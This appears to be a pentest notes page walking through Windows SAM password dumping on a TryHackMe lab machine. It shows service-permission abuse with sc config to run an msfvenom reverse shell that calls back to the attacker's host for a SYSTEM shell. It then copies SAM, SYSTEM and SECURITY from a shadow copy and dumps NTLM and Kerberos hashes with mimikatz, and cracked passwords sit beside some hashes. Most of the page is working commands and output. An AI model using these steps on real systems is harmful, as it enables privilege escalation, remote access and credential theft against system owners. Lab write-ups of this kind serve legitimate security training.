---
layout: default
title:  "SAM Dumping"
weight: 2
type: docs
---

### 1️⃣ Introduction   
- Dumping SAM (Security Account Manager) passwords means extracting hashed credentials from the Windows SAM database. Attackers do this to perform offline cracking or lateral movement in a network.   
   
### 2️⃣ Description   
- SAM stores hashed passwords of local user accounts.   
- Hashes are usually in **NTLM** or **LM** format.   
- The SAM file is locked by the system, so direct access is restricted.   
- Attackers bypass restrictions using privilege escalation or system vulnerabilities.   
   
   
|       |                                                                                                               Windows 7 |                                                                                                                                                                                   Windows 10 |
|:------|:------------------------------------------------------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Tools | 1.PwDump7 2.SamDump2 3.Metasploit Framework 5.Invoke-PowerDump.ps1 6.Get-PassHashes.ps1 7.PowerShell 8.Powerdump Manual | 1.Mimikatz 2.Impacket 3.Metasploit Framework     a.HashDump     b.Credential\_collector     c.Load\_kiwi (Mimikatz) 4.Koadic 5.PowerShell Empire     a.Mimikatz/sam 7.LaZagne 8.CrackMapExec |

#We will see each tools one by one in detail as we move ahead.    
   
I have chose a target a tryhackme vulnerable machine we will try on that, As discussed dumping SAM creds require a access to windows machine or at least low privileged account.   
   
Hear we have one with username:user and password:password321, As we login we need to check the privileges of our user we have logged in.   
   
There are various ways to get the privileg info we will look at most common way.   
   
### #whoami /all Summary   
   
```
C:\Users\user> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ==============================================
win-qba94kb3iof\user S-1-5-21-3025105784-3259396213-1915610826-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```
   
**#The "whoami /all" command. Lists the current user along with group memberships and privileges.**   
**Username**: user (Standard User)   
**SID**: Unique identifier for the account   
**Group Memberships:**   
  - Part of **BUILTIN\Users** (Standard users)   
  - **NOT** in Administrators (Limited privileges)   
**Privilege Level: Medium (Cannot run admin tasks)**   
**Key Privileges:**   
  - **SeChangeNotifyPrivilege** → Enabled (Basic file access)   
  - **SeShutdownPrivilege & SeIncreaseWorkingSetPrivilege** → Disabled   
  - **No SeDebugPrivilege, SeBackupPrivilege** → **Cannot dump SAM**
   
   
### #net localgroup Adminstrators Summary   
   
```
C:\Users\user>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.
```
   
**#This command lists all users in the Administrators group.**   
**Members:**   
  - `admin`   
  - `Administrator` (Default built-in admin account)   
Your account ( **`user`) is NOT listed**, meaning you **do not have admin rights**.   
**To perform admin tasks, you need to use one of the listed admin accounts or escalate privileges.**   
   
### **#net session**   
   
```
PS C:\Users\user> net session
System error 5 has occurred.

Access is denied.
```
   
The `net session` command **displays active network sessions** connected to the computer. It is mainly used for **monitoring remote connections** and requires **administrator privileges** to run.   
   
If we get the output after running the command we have admin privileges but now we don't have so lets move ahead.   
   
### #Using [accesschk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to find vulnerable services   
   
```
C:\PrivEsc>accesschk.exe -wcuv "user" *

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```
   
Now when we run the accesschk.exe command we get a service call "daclsvc" with read and write access, lets go further ahead and get more info on that service.   
   
```
C:\PrivEsc>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
   
The "sc qc <servicename>" give us more information about the service, so by observing it we can see the "service\_start\_name" which is localsystem it means that the service is running with admin privileges.   
   
So hear now we can change the daclservice.exe with our own reverseshell.exe file, below are some basic command to start, stop, and change the service's .exe file path.   
   
```
#To change the file path 
sc config <service_name> binPath= "<new_exe_path>"

#To start and Stop service 
net stop <service_name> && net start <service_name>


```
   
What u need to do now is.   
 1.make a windows payload using msfvenom. (use payload shell\_reverse\_tcp)   
 2.Then transfer the payload to windows.   
 3.Then change the service file path with payload file.   
 4. Start the service.   
   
```
msf6 exploit(multi/handler) > exploit 
[*] Started reverse TCP handler on 10.8.67.206:53 
[*] Command shell session 3 opened (10.8.67.206:53 -> 10.10.144.224:49718) at 2025-03-23 09:26:33 +0530


Shell Banner:
Microsoft Windows [Version 10.0.17763.737]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

```
   
After starting we will get a rev shell with admin privileges, lets dump the SAM hashes using mimikaza,   
  First we will copy the SAM SYSTEM and SECURITY file.   
```
C:\PrivEsc>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\PrivEsc\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\PrivEsc\SAM
        1 file(s) copied.

C:\PrivEsc>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\PrivEsc\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\PrivEsc\SYSTEM
        1 file(s) copied.

C:\PrivEsc>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\PrivEsc\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\PrivEsc\SECURITY
        1 file(s) copied.

```
   
After copying the files we can use mimikazha to dump those NTML hash as shown below.   
   
```
C:\PrivEsc>mi.exe
mi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
Domain : WIN-QBA94KB3IOF
SysKey : f4fb8f729017b7d8a540e99f6dabea79
Local SID : S-1-5-21-3025105784-3259396213-1915610826

SAMKey : 9898f0f5c79b1fa7e7bf87bda7069f20

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889 #Passw0rd

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0c2966dfe35260b0d9ef6908aa2bd5f0

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-QBA94KB3IOFAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 969722855eddc5878ff99a9b0beb6a675738474e893a18f23284a8729c515d9a
      aes128_hmac       (4096) : b149e9c75ec17aab4fb81c8e4cabd8ef
      des_cbc_md5       (4096) : b3f73198cb6ece16

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-QBA94KB3IOFAdministrator
    Credentials
      des_cbc_md5       : b3f73198cb6ece16


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 6ebaa6d5e6e601996eefe4b6048834c2*

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ae7bc62ea0204862b0b0516f0fe66d4a

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c98cb92bb0e1037b70ae4566a8420fc1a0354129dc1c483366844c0fa2149ddd
      aes128_hmac       (4096) : db761fa8780b36ab611aef624822251d
      des_cbc_md5       (4096) : e3f4859e7504b3c8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : e3f4859e7504b3c8


RID  : 000003e8 (1000)
User : user
  Hash NTLM: 91ef1073f6ae95f5ea6ace91c09a963a #password321


Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a52c51fef3547f3485ba9c4c74bb36a2

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-QBA94KB3IOFuser
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d3da547383b9c97804e137b2014e2686c11039cf525738f50f4d5fc0238d973e
      aes128_hmac       (4096) : d61509c6adf1b1ce9ae4ca488d3a669e
      des_cbc_md5       (4096) : 5b1acbc1e06bbc2a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-QBA94KB3IOFuser
    Credentials
      des_cbc_md5       : 5b1acbc1e06bbc2a


RID  : 000003e9 (1001)
User : admin
  Hash NTLM: a9fdfa038c4b75ebc76dc855dd74f0da #password123

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 5ed8d47101bb9b66689acb4a5d0657a2

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-QBA94KB3IOFadmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0dd33363e8b71d2bfe854b487f1b5d7cd16e8ddf583f7dd3d6652b4bdece0a4a
      aes128_hmac       (4096) : 9abd718239f8c11884a8b4631355c9a0
      des_cbc_md5       (4096) : fb1325b94f9ec45b
    OldCredentials
      aes256_hmac       (4096) : 0dd33363e8b71d2bfe854b487f1b5d7cd16e8ddf583f7dd3d6652b4bdece0a4a
      aes128_hmac       (4096) : 9abd718239f8c11884a8b4631355c9a0
      des_cbc_md5       (4096) : fb1325b94f9ec45b
    OlderCredentials
      aes256_hmac       (4096) : 0dd33363e8b71d2bfe854b487f1b5d7cd16e8ddf583f7dd3d6652b4bdece0a4a
      aes128_hmac       (4096) : 9abd718239f8c11884a8b4631355c9a0
      des_cbc_md5       (4096) : fb1325b94f9ec45b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-QBA94KB3IOFadmin
    Credentials
      des_cbc_md5       : fb1325b94f9ec45b
    OldCredentials
      des_cbc_md5       : fb1325b94f9ec45b

```
   
We can see the NTLM hashe's   
   
